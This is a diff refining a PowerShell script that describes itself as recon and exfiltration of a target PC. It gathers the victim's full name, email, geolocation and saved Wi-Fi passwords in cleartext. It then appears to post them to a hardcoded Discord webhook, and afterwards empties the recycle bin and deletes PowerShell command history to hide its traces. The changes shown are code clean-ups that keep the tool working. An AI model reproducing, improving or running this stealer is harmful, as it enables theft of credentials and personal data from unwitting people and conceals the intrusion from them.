@@ -1,6 +1,7 @@
 <# 
 .SYNOPSIS
 Advanced recon of a target PC and exfiltration of gathered data via Discord webhook.
+
 .DESCRIPTION 
 This script gathers detailed information from a target PC and sends a summary to a specified Discord webhook.
 #>
@@ -8,8 +9,8 @@ This script gathers detailed information from a target PC and sends a summary to
 #############################################################################################################
 # Configuration Variables
 $DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"
-$OutputFileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
-$OutputFilePath = "$env:TMP\$OutputFileName"
+$OutputFileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_hh-mm)_computer_recon.txt"
+$OutputFilePath = "$env:TEMP\$OutputFileName"
 #############################################################################################################
 
 # Function: Get Full Name
@@ -25,7 +26,7 @@ function Get-FullName {
 # Function: Get Email
 function Get-Email {
     try {
-        $email = (gpresult -z /USER $env:USERNAME | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})").ToString().Trim()
+        $email = (gpresult -z /USER $env:USERNAME | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+\.[a-zA-Z]{2,5})").Matches[0].Value
         return $email
     } catch {
         return "No Email Detected"
@@ -44,7 +45,8 @@ function Get-GeoLocation {
         if ($GeoWatcher.Permission -eq 'Denied') {
             return "Access Denied"
         } else {
-            return $GeoWatcher.Position.Location | Select Latitude, Longitude
+            $location = $GeoWatcher.Position.Location
+            return "Latitude: $($location.Latitude), Longitude: $($location.Longitude)"
         }
     } catch {
         return "No Coordinates Found"
@@ -56,9 +58,11 @@ function Get-WifiPasswords {
     try {
         $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
             $_ -match ':\s*(.+)$' | Out-Null
-            $profile = $matches[1]
+            $profile = $matches[1].Trim()
             $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
-if ($keyContent) { "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')" }
+            if ($keyContent) {
+                "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')"
+            }
         }
         return $profiles -join "`n"
     } catch {
@@ -81,14 +85,20 @@ function Send-ToDiscord {
     }
 }
 
-
 # Main Script: Gather Information
 $FullName = Get-FullName
 $Email = Get-Email
 $GeoLocation = Get-GeoLocation
 $WiFiPasswords = Get-WifiPasswords
 $HostName = $env:COMPUTERNAME
-$SystemInfo = "User: $FullName`nEmail: $Email`nHostname: $HostName`nGeoLocation: $GeoLocation`nWi-Fi Passwords:`n$WiFiPasswords"
+$SystemInfo = @"
+User: $FullName
+Email: $Email
+Hostname: $HostName
+GeoLocation: $GeoLocation
+Wi-Fi Passwords:
+$WiFiPasswords
+"@
 
 # Save Information to File
 $SystemInfo | Out-File -FilePath $OutputFilePath -Encoding UTF8
@@ -104,4 +114,8 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 # Signal Completion
-(New-Object -ComObject Wscript.Shell).Popup("Script execution complete", 1)
+try {
+    (New-Object -ComObject Wscript.Shell).Popup("Script execution complete", 1)
+} catch {
+    Write-Host "Popup notification failed."
+}
